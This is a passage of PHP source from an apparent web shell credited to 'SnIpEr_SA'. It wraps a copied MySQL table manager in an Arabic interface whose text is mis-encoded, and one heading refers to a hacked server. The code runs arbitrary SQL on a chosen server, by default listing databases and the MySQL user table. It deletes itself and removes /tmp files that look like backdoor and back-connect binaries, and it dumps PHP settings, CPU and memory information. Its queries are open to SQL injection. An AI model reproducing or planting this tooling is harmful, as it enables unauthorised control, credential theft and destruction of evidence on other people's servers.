            echo"</select></td></tr>\n";
// End of new code block for set drop down


        }else{
                        echo"<td><input type=text name='array[$i]' size='$flen' value='$nslash' /></td></tr>\n";
                }
                for($f =0; $f< count($pk);$f++){
                        echo"<input type=hidden name=pk[$f] value='$pk[$f]' />";
                        echo"<input type=hidden name=pv[$f] value='$pv[$f]' />\n";
                }
        }
        echo"<tr><td><input class=but type=submit name='editrec' value='Update' /></td>\n";
        echo"<td><input class=but type=reset name='reset' value='Reset Form' /></td>\n";
        echo"</tr>";
        echo"</table>\n";
        echo"</form>\n";
}
//************************Edit Record*************************
function editrec($dbname, $tablename, $pk, $pv, $array){

        //$result = @mysql_query( "Select * from $tablename" );
    $result = exequery("Select * from $tablename", $tablename, $dbname);
        $flds = mysql_num_fields($result);
        $fields = mysql_list_fields($dbname, $tablename);

//Build Query
           $qry="";
    $query = "UPDATE $tablename set ";
        for ($x =0; $x < $flds; $x++){
                $fie = mysql_field_name($fields, $x );
        // SET and ENUM
         if(is_array($array[$x])){
            $mval="";
            for($m=0; $m < count($array[$x]); $m++){
                if($m+1 == count($array[$x])){
                    $mval.= AddSlashes($array[$x][$m]);
                }else{
                    $mval.= AddSlashes($array[$x][$m]).",";
                }
                $fval = $mval;
            }
        }else{
                    $fval = AddSlashes($array[$x]);
        }
        //**************************
                //$fval = AddSlashes($array[$x]);
                $qry .= "$fie = '$fval'";
                if ($x < $flds-1){
                        $qry.= ", ";
                }
        }
        $whr = buildwhr( $pk, $pv);
        $whr =StripSlashes($whr);
        $query .= "$qry";
        $query .= " where $whr";

    $result=exequery($query, $tablename, $dbname);
        if($result){
                return $result;
        }else{
                return false;
        }
}
//****************** Number of Primary Keys ***********************
function numpk($result){
        $z =0;
        for ($i = 0; $i < $flds; $i++) {
                //Find the primary key
                $flagstring = mysql_field_flags ($result, $i);
                if(eregi("primary",$flagstring )){
                        $z++;
                }
        }
        return $z;
}
//********************Size field*****************
function fieldformsize($ft, $i, $l){
        $ft= trim(strtoupper($ft));
        if($ft =="DATE" || $ft=="TIME" || $ft== "DATETIME" ){
        }elseif( $ft=="TINYTEXT" || $ft=="BLOB" || $ft=="TEXT" || $ft =="MEDIUMBLOB"){
                echo"<input type=hidden name='leng[$i]' value=$l>";
        }elseif($ft=="MEDIUMTEXT" || $ft=="LONGBLOB"|| $ft=="LONGTEXT" || $ft=="TINYBLOB"){
                echo"<input type=hidden name='leng[$i]' value=$l>";
        }elseif($ft=="INT" || $ft=="TINYINT"|| $ft=="SMALLINT"|| $ft=="MEDIUMINT"|| $ft=="BIGINT" || $ft=="INTEGER"){
                echo"<input type=text name='leng[$i]' size=5  value=$l>";
        }elseif($ft=="YEAR" ){
                echo"<select name='leng[$i]'>";
                echo"<option value='4'>4";
                echo"<option value='2'>2";
                echo"</select>\n";
    }elseif($ft=="SET"|| $ft=="ENUM"){
        echo"<input type=text name='leng[$i]' title='values eg \"a\", \"b\", \"c\"' value='' />";
        }else{
                echo"<input type=text name='leng[$i]' size=5 value=$l />\n";
        }
}

//******************************Display Row ******************************
function displayrow($dbname, $tbl, $pk, $pkfield, $cpk, $row, $flds){
        $pkfs="";
        $hv="";
        $hf="";

        if($cpk >0 && !empty($pkfield)){
                for($a = 0; $a < $cpk; $a++){
                        $fieldn = $pkfield[$a];
                        $hf .= "<input type=hidden name=pk[$a] value='$pkfield[$a]' />";
                        $hv .= "<input type=hidden name=pv[$a] value='$row[$fieldn]' />";
                }
        }else{ //No Primary Key so use all fields
                $fields = mysql_list_fields($dbname, $tbl);
                for($b = 0; $b < $flds; $b++){
                        $fie = mysql_field_name($fields, $b );
                        $hf .= "<input type=hidden name=pk[$b] value='$fie' />";
                        $hv .= "<input type=hidden name=pv[$b] value='$row[$b]' />";
                }
        }
        echo"<tr>\n";
        //edit Record
        echo"<td><form action='$action' method=post>\n";
        echo"<input type=hidden name=dbname value='$dbname' />\n";
        echo"<input type=hidden name=tablename value='$tbl' />\n";
        echo"<input type=hidden name=npkeys value='$cpk' />\n";
        echo"$hf";
        echo"$hv";
        echo"<input class=sml type=submit name=edit value='Edit Record' />\n";
        echo"</form></td>\n";

        //Delete record
        echo"<td><form action='$action' method=post>\n";
        echo"<input type=hidden name=dbname value='$dbname' />\n";
        echo"<input type=hidden name=tablename value='$tbl' />\n";
        echo"<input type=hidden name=num value='$cpk' />\n";
        echo"$hf";
        echo"$hv";
        echo"<input class=smldel type=submit name=delete value='Delete Record' />\n";
        echo"</form></td>";

        //Display all the columns.
        for($col = 0; $col < $flds; $col ++){
                $nslash = StripSlashes($row[$col]);
                echo"<td>$nslash</td>";
        }
        echo"</tr>";

}
//***********************Remove Array Copy********************************
//removes copies from an array $x.

function removearraycopy($x){
        $leng= count($x);
        sort($x);
        $farr=array();

        for ($i =0; $i < $leng; $i++){
                $flag=false;
                for ($s =0; $s < count($farr); $s++){
                        if($x[$i]==$farr[$s]){
                                $flag=true;
                        }
                }
                if ($flag == false){
                        $farr[count($farr)] = $x[$i];
                }
        }
        return $farr;
}
//***********************<< page position >>********************************
function whichpage($num_rows, $pagemax, $pg, $tablename, $searchval){
        $pgs = $num_rows/$pagemax;
        $pgs=ceil($pgs);
                            //round up the number of pages.
        echo"<form action='$action' id='recspage' method='post' name='recspage'>\n";
    echo"Total number of records $num_rows, displayed on $pgs pages of \n";
    echo"<input type='text'  name='pagemax' value='$pagemax' size='4' onchange='javascript:this.form.submit();' title='Type the number records to display on a page then click outside the box' /> \n";
        echo"<input type='hidden' name='searchval' value='$searchval'  />\n";
    echo"<input type='hidden' name='tablename' value='$tablename'  />\n";
    echo"records per page.</form> \n";
    $pagescrol="";
    $sval="";
          if($pgs >1){
            $pagescrol="<div class='pagecount'>\n";
                        $nxt=$pg+1;
            $bk=$pg-1;
            $lst=$pgs;
            $end=$lst-1;
            $showp=$pg+1;
           if($searchval !=""){
            $sval="&amp;searchval=$searchval";
           }
           $pagescrol .= "<form name='pages' id='pages' action='$action' method='get'>\n";
            if($pg>=1){
                $pagescrol .= " <a href='$action?tablename=$tablename&amp;pg=0$sval' title='To first page'> 1 :<< </a> \n";
                                $pagescrol .= " <a href=''action'?tablename=$tablename&amp;pg=$bk$sval' title='Back one page'> < </a> \n";
                        }
           $pagescrol .= "<input type='text' name='pg' value='$showp' size='4' onchange='javascript:this.form.submit();' title='Type a page number then click outside the box' />\n";
           $pagescrol .= "<input type='hidden' name='pback' value='true'  />\n";
           $pagescrol .= "<input type='hidden' name='searchval' value='$searchval'  />\n";
           $pagescrol .= "<input type='hidden' name='tablename' value='$tablename'  />\n";

           if($showp < $lst){
                $pagescrol .= " <a href=''action'?tablename=$tablename&amp;pg=$nxt$sval' title='Next page'> > </a> \n";
                $pagescrol .= " <a href=''action'?tablename=$tablename&amp;pg=$end$sval' title='To Last page'> >>: $lst</a> \n";
           }
           $pagescrol .= "</form>\n";
           $pagescrol.="</div>\n";
      }
        return $pagescrol;
}

//*************Display Footer*************************
//Please don't remove or change.
function display_foot(){

    echo"<div class='foot'>Version $version &copy; ".date('Y')." <a style='text-decoration:none;' target='_blank' href='http://www.SnIpEr-SA.com'>SnIpEr_SA</a></div>";

    }
//*************My Size*************************
//Returns the size of a table or database
function mysize($dbname, $tablename){
    $like="";
    $total="";
    $t=0;
    if($tablename !=""){
        $like=" like '$tablename'";
    }
    $sql= "SHOW TABLE STATUS FROM $dbname $like";
    //$result = mysql_query($sql);
    $result=exequery($sql, $tablename, $dbname);
    if($result){

        while($rec = mysql_fetch_array($result)){
         $t+=($rec['Data_length'] + $rec['Index_length']);
         }
        $total ="<span class='bytes'>$t bytes</span>";
    }else{
        $total="Unknowen";
    }
    return($total);
}


//**************************************
//DEBUG to show all being passed to the page
function showpassingvars(){
        echo"Get: ";
         foreach($_GET as $pram=>$value){
                 echo"$pram: $value, ";
         }
        echo"<br>Post: ";
         foreach($_POST as $pram=>$value){
                  echo"$pram: $value, ";
         }
         echo"<br>Session: ";
         foreach($_SESSION as $pram=>$value){
                 echo"$pram: $value, ";
         }
 }
echo"<html>\n";
echo"<meta http-equiv='Content-Type' content='text/html; charset=windows-1256'>\n";
echo"<head>\n";
echo"<title>”ﬂ—»  «·« ’«· »ﬁÊ«⁄œ «·»Ì«‰« </title>\n";
echo"<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #cccccc;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #cccccc;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #cccccc;
}
input {
BORDER-RIGHT:  #990000 1 solid;
BORDER-TOP:    #990000 1 solid;
BORDER-LEFT:   #990000 1 solid;
BORDER-BOTTOM: #990000 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #CCCCCC;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #cccccc;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #cccccc;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>\n";
echo"<meta http-equiv='Content-Type' content='text/html charset=windows-1256'>";
echo"<title>”ﬂ—»  «·« ’«· »ﬁÊ«⁄œ «·»Ì«‰« </title>\n";
echo"<meta name='author' content='Tony Aslett'>";
echo"<meta name='title' content='PHP:MySQL Table Manager'>";
echo"<meta name='description' content='Table Manager for MySQL Database'>";
echo"<link rel='stylesheet' href='tmgrstyles.css' type='text/css'>\n";
echo"</head>\n";
echo"<body>\n";

$showall=true;
echo"<h2 class=h >”ﬂ—»  «·« ’«· »ﬁÊ«⁄œ «·»Ì«‰« </h2>\n";
//******************* Session Logon ***********************
if(isset($_POST['logout'])){

                $_POST['dbname']="";
                session_unset();
                session_destroy();
}
if(isset($_POST['userid']) && isset($_POST['pword1'])){
        $_SESSION['user'] = $_POST['userid'];
        $_SESSION['password'] = $_POST['pword1'];
}

if (!isset($_SESSION['user']) || !isset($_SESSION['password'])){
        echo"<div align=center>";
        echo"<h2>«œŒ· »Ì«‰«  «·”Ì—›— «·„Œ —ﬁ</h2>\n";
        If(!isset($dbnamearray)){
                $dbnamearray="";
        }
        show_login($dbnamearray);
        echo"</div>";
}else{
        //show logout option.
        echo"<div align=right>";
        endsess();
        echo"</div>";
}
//*****dbname
if(isset($_POST['dbname'])){
        $dbname=$_POST['dbname'];
    $_SESSION['dbname']= $_POST['dbname'];
}
//***** Host
if(isset($_POST['host'])){
    $host=$_POST['host'];
    $_SESSION['host']=$_POST['host'];
}
//******set tablename
if(isset($_GET['tablename']) ){
        $tablename=$_GET['tablename'];
}elseif(isset($_POST['tablename'])){
        $tablename=$_POST['tablename'];
}
//********** pagemax
if(isset($_POST['pagemax'])){ //&& is_int($_POST['pagemax'])){
    $isnum=true;
    for($o=0; $o<count($_POST['pagemax']); $o++){
            if($_POST['pagemax'][$o]>9){
                $isnum=false;
            }
    }
    if($_POST['pagemax']>0 && $isnum){
        $_SESSION['pagemax']=$_POST['pagemax'];
    }
}
 if(isset($_SESSION['pagemax'])){
    $pagemax=$_SESSION['pagemax'];
 }
//******** create a new Database ************
if(isset($_POST['cndb'])){
    connectmysql();
        $sql="create database $_POST[ndbname]";
        $result=exequery($sql, " ", $_POST['ndbname']);
        if ($result){
                $_SESSION['dbname'] = $_POST['ndbname'];
        $sql="Use $_POST[ndbname]";
            $result=exequery($sql, " ", $_POST['ndbname']);
        if($result){
            echo"<h2>ﬁ«⁄œ… ÃœÌœ… $_SESSION[dbname] </h2>\n";
        }
        }
}

//*********************************************
if (! isset($_SESSION['dbname']) && ! isset($dbnamearray) && ! isset($_POST['dbname']) && isset($_SESSION['user'])){ //*********post
        //Databse names
        showdb();
}
//************************ Choose DB *************
if(isset($_POST['dbname']) && $_POST['dbname']==""){
    showdb();
}

//**********
if (isset($_SESSION['dbname']) || isset($_POST['dbna']) || isset($_POST['dbname'])){
//*************************************
                //connection

                if (isset($_SESSION['dbname'])){
                        $dbsetname = $_SESSION['dbname'];
                }elseif(isset($_POST['dbname'])){
                        $dbsetname = $_POST['dbname'];
                        $_SESSION['dbname'] = $_POST['dbname'];
                }else{
                        $dbsetname = $_POST['dbna'];
                        $_SESSION['dbname'] = $_POST['dbna'];
                }
}
//*************************** we have a DB set
if(isset($dbsetname) && $dbsetname!=""){
                    $link= connectmysql();
            //echo"DBS: $dbsetname";
                    $conn = connectdb($dbsetname, $link);

//*********** Drop Table **************
        if(isset($_POST['deltable'])){
        $showall=false;
                $tablename=$_POST['tablename'];
                echo"<h1>!!!  Õ–Ì— !!! <br>«‰   Õ«Ê· „”Õ Â–« «·ÃœÊ· $tablename<br>";
                echo"Â· «‰  „ «ﬂœ „‰ «·ﬁÌ«„ »«·⁄„·ÌÂø?</h1>\n";
                $va="Drop $tablename";
                goto($tablename, $dbname,$action, 'del', 'droptab', $va );
        }
        if(isset($_POST['droptab'])){
                $tablename=$_POST['tablename'];
                $dsql = "drop table $tablename";
                $result=exequery($dsql, $tablename, $dbname);
                unset($tablename); //="false";
                unset($_POST['tablename']);
        }
//*****************Write Your Own Query *****************
        if(isset($_POST['wyoq'])){  //post
                $value="«·Ê«ÃÂÂ «·—∆Ì”ÌÂ ··”ﬂ—» ";
                goto($tablename, $dbname, $action, 'but', 'start', $value );
                echo"<form method='post'>\n";
                echo"<input type='hidden' name='dbname' value=$dbname>\n";
                //echo"<input type=text name='wyqota' width='500px' style='overflow-x:visible;'>\n";

                echo"<textarea name='wyoqta' cols='60' rows='5' style='overflow-y:visible'></textarea>\n";

                echo"<br><input class=but type=submit name='runquery' value='Execute Query'>\n";
                echo"</form><br>\n";
        }

        if(isset($_POST['runquery'])){
                $wyoqta = StripSlashes($_POST['wyoqta']);
                $result=exequery($wyoqta, " ", " ");

                if(@mysql_num_rows($result) >0){
                         $numrows=mysql_num_rows($result);
                        $flds=mysql_num_fields($result);
                        echo"<table>";
                        for($r=0; $r < $numrows; $r++){
                                echo"<tr>";
                                $row=mysql_fetch_array($result);
                                for($col = 0; $col < $flds; $col ++){
                                        $nslash = StripSlashes($row[$col]);
                                        echo"<td>$nslash</td>";
                                }
                                echo"</tr>";
                        }
                        echo"</table>";
                }elseif (mysql_affected_rows()){
                        echo" Number of Rows affected: ".mysql_affected_rows();
                }else{
                        echo" Nothing returned from the query.";
                }
        }
// ****************List Tables***************************

        if( ! isset($tablename) || $tablename==" " ){
                $dbname=$_SESSION['dbname'];
                $result = mysql_list_tables($_SESSION['dbname']);
                 $numtab = mysql_num_rows ($result);
                 if($numtab == 1){
                        $_SESSION['tablename'] =mysql_tablename($result, 0);
                 }

//***************** Buttons ******************************
                if (isset($_POST['runquery'])){
                        $dbname=$_SESSION['dbname'];
                        $value="$dbname Start"; //Table Manager Start
                        goto("", $_SESSION['dbname'], $action, 'but', 'tablestart', $value );

                }elseif (! isset($_POST['wyoq']) && ! isset($_POST['runquery'])){ //write your own query.
                        echo"<table width=40% border=0 align='left' >\n";
                        echo"<tr><td>";

                        $va="≈‰‘«¡ ÃœÊ· ÃœÌœ";
                        goto("", $_SESSION['dbname'], "create.php", 'but', 'create', $va );
          //  echo"<a href=create.php class='crt'>Create new Table</a>\n";
                        echo"</td><td>";

        $value="«·Ê«ÃÂÂ «·—∆Ì”ÌÂ"; //Choose DB
                goto("", "", $action, 'but', 'db', $value );
                echo"</td>\n";

                        $value="Write Your Own Query";
                        goto(" ", $_SESSION['dbname'], $action, 'but', 'wyoq', $value );

                        echo"</td></tr>";
                        echo"</table><br><br><br><br><div style='clear:both;'></div>";

                        echo"<table width=100% border=0 align='center' >\n";
                        for ($i =0; $i < $numtab; $i++) {

                                $tb_names[$i] = mysql_tablename($result, $i);
                                echo"<tr class='frow'><td align='center'>\n";

                                $va="⁄—÷ ÃœÊ· * $tb_names[$i]";
                                goto($tb_names[$i], $_SESSION['dbname'],$action, 'but', $tb_names[$i], $va );
                                echo"</td><td  align='center' valign='middle'>\n";

                                $va="„”Õ ÃœÊ· $tb_names[$i]";
                                goto($tb_names[$i], $_SESSION['dbname'],$action, 'del', 'deltable', $va );
                                echo"</td><td  align='center' valign='middle'>\n";

                                $va="Alter Table $tb_names[$i]";
                                goto($tb_names[$i], $_SESSION['dbname'],'alter.php', 'but', 'altertable', $va );
                                echo"</td><td align='center' valign='middle'>\n";

                                searchtableform($tb_names[$i], $_SESSION['dbname']);
                                echo"</td><td>";
                //Table size in bytes
               echo mysize($_SESSION['dbname'],$tb_names[$i]);

                echo"</td></tr>\n";
                        }//for
                        echo"</table>\n";
                }

        }else{ //tablename is set
//***************** menu *****************************************
                echo"<table><tr class='frow'><td>\n";
                $value="$_SESSION[dbname] Start"; //Ex Table Manager Start
                goto($tablename, $_SESSION['dbname'], $action, 'but', 'tablestart', $value );
                echo"</td>\n";

        echo"<td>\n";
        $value="«·Ê«ÃÂÂ «·—∆Ì”ÌÂ"; //Choose DB
                goto("", "", $action, 'but', 'start', $value );
                echo"</td>\n";

        echo"<td>\n";
        $value="Write Your Own Query";
                goto(" ", $_SESSION['dbname'], $action, 'but', 'wyoq', $value );
        echo"</td>\n";

                if (!isset($_POST['add']) && !isset($_POST['deltable']) && isset($tablename)){
                        echo"<td>";
                        //$tablename = $_POST['tablename'];
                        $va="Add a $tablename Record";
                        goto($tablename, $_SESSION['dbname'], 'alter.php', 'but', 'add', $va );
                        echo"</td>\n";
                }

                if (!isset($_POST['deltable'])){
                        echo"<td>\n";
                        searchtableform($tablename, $_SESSION['dbname']);
                        echo"</td>\n";
                }
                echo"</tr></table>\n";
                echo"<br />\n";

//**************************************************

                if(isset($_POST['addrec'])){
           // $showall=false;
                        $result=addrecord($tablename, $_SESSION['dbname'], $_POST['array']);
                }elseif(isset($_POST['add'])){
            $showall=false;
                        addform($tablename, $_SESSION['dbname']);
                }elseif(isset($_POST['delete'])){
                        //delete record has been pushed
           // $showall=false;
                        $whr=buildwhr($_POST['pk'], $_POST['pv']);
                        $sql = "delete from $tablename where $whr";
                        $result=exequery($sql, $tablename, $_SESSION['dbname']);
                }elseif (isset($_POST['edit'])){//Edit
            $showall=false;
                        $whr = buildwhr( $_POST['pk'], $_POST['pv']);
                        //$tablename = $_SESSION['tablename'];
                        $sql= "Select * from $tablename where $whr";

                        $result=exequery($sql, $tablename, $_SESSION['dbname']);
                        editform($tablename, $_SESSION['dbname'], $result, 'edit', $_POST['pk'], $_POST['pv']);
                }elseif(isset($_POST['editrec'])){
           // $showall=false;
                        $result=editrec($_SESSION['dbname'],$tablename, $_POST['pk'], $_POST['pv'], $_POST['array']);
                }
//**************** Search ************************************
                if(isset($_POST['searchval'])){
                        $searchval=$_POST['searchval'];
                }elseif(isset($_GET['searchval'])){
                        $searchval=$_GET['searchval'];
                }else{
                        $searchval="";
                }

                if (isset($_GET['tablename'])){
                        $tablename = $_GET['tablename'];
                }

                if((isset($_POST['search'])|| isset($searchval)) && $searchval !=""){
                        $result=searcht($tablename, $_SESSION['dbname'],  $searchval);
                }else{
                        //Display All
                        $query = "select * from $tablename";
                        $result=exequery($query, $tablename, $_SESSION['dbname']);
                }

//***************** Display record count *****************************************
        if($showall){
            $num_rows = mysql_num_rows($result);
            //Workout whick page to display
                    if(!isset($_GET['pg']) && !isset($pg)){
                            $beg=0;
                $pg=0;
                    }else{
                if(isset($_GET['pback'])){
                    $pg=$_GET['pg'];
                }else{
                    $pg=$_GET['pg'];
                }
                 if($pg < 0 ){
                    $pg=0;
                }
                if($pg > $num_rows/$pagemax){
                    $pg=ceil($num_rows/$pagemax)-1;
                }
                $beg = $pg * $pagemax;

                    }
                    if (!isset($_POST['add'])){
                            $pscrol=" ";
                            $pagescrol =" ";

                            $pagescrol = whichpage($num_rows, $pagemax, $pg, $tablename, $searchval);

                            echo "$pagescrol\n"; //Display next Top page menu

                            $flds = mysql_num_fields($result);
                            echo"<table border=0 width='100%'>\n";
                            echo"<tr class=head><td></td><td></td>\n";
                            $fields = mysql_list_fields( $_SESSION['dbname'], $tablename);

                            $z=0;
                            $x =0;
                            $pkfield=array();

//*************Display each of the field names.***************************
                            for ($i = 0; $i < $flds; $i++) {
                                        echo "<td>".mysql_field_name($fields, $i)."</td>\n";

                                    //Find the primary key
                                    $flagstring = mysql_field_flags ($result, $i);
                                    if(eregi("primary",$flagstring )){
                                            $pk[$z] = $i;

                                            $pkfield[$z]= mysql_field_name($fields, $i);
                                            $z++;
                                    }
                            }
                            echo"</tr>\n";
                            $tbl=$tablename;
                            //if(isset($pk)){
                            if($z > 0){
                                    $cpk=count($pk);
                            }else{
                                    $cpk=0;
                            }

//************Display each row from the table.********************************

                            for ($s=$beg; $s < $beg + $pagemax; $s++){
                                    if($s < $num_rows){
                                            if (!mysql_data_seek ($result, $s)) {
                                        echo "Cannot seek to row $s\n";
                                        continue;
                                    }
                                            $row=mysql_fetch_array($result);
                                            if(!isset($pk)){
                                                    $pk=" ";
                                                    $pkfield= array();
                                            }
                                            displayrow($_SESSION['dbname'], $tbl, $pk, $pkfield, $cpk, $row, $flds);
                                    }
                            }
                    }
                    echo"</table>\n";
                    if (!isset($_POST['add']) && !isset($_POST['edit']) && !isset($_POST['deltable']) && !isset($_POST['droptab']) && !isset($_POST['wyoq']) && $tablename){
                            echo"<br>";
                            echo "$pagescrol\n"; //Display bottom next page menu
                    }
                    echo"<br><br>\n";
                 }//showall
                 if(isset($_POST['tablename'])){
                         echo"<table border=0>";
                     echo"<tr><td>";
                         $tablename=$_POST['tablename'];
                         $va="Alter Table $tablename";
                         goto( $tablename,  $_SESSION['dbname'],'alter.php', 'but', 'altertable', $va );
                         echo"</td></tr>\n";
                         echo"</table>\n";
                }
        }
}
display_foot();
echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";  die(); }

if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 echo '<body bgcolor=#000000>';
 if(!$sql->connect()) echo "<div align=center><font face=tahoma size=-2 color=red><b>Can't connect to SQL server</b></font></div>";
  else
   {
   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=tahoma size=-2 color=red><b>·„ Ì” ÿÌ⁄  ÕœÌœ ﬁ«⁄œÂ «·»Ì«‰« </b></font></div>";
   else
    {
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5)
      {
      echo "<font face=tahoma size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))
       {
       case '0':
       echo "<table width=100%><tr><td><font face=tahoma size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1':
       if($sql->get_result())
        {
               echo "<table width=100%>";
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
               $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=tahoma size=-2><b>&nbsp;", $sql->columns);
        echo "<tr><td bgcolor=#333333><font face=tahoma size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)
         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;</font></td><td><font face=tahoma size=-2>&nbsp;",$sql->rows[$i]);
         echo '<tr><td><font face=tahoma size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
         }
        echo "</table>";
        }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
       echo "<table width=100%><tr><td><font face=tahoma size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break;
       }
      }
     }
    }
   }
 echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center>";
 echo "<font face=tahoma size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>";
 echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
 echo "</form>";
 echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(__FILE__);
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#000000><font face=tahoma size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#000000><font face=tahoma size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#000000><font face=tahoma size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.$key.'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=tahoma size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
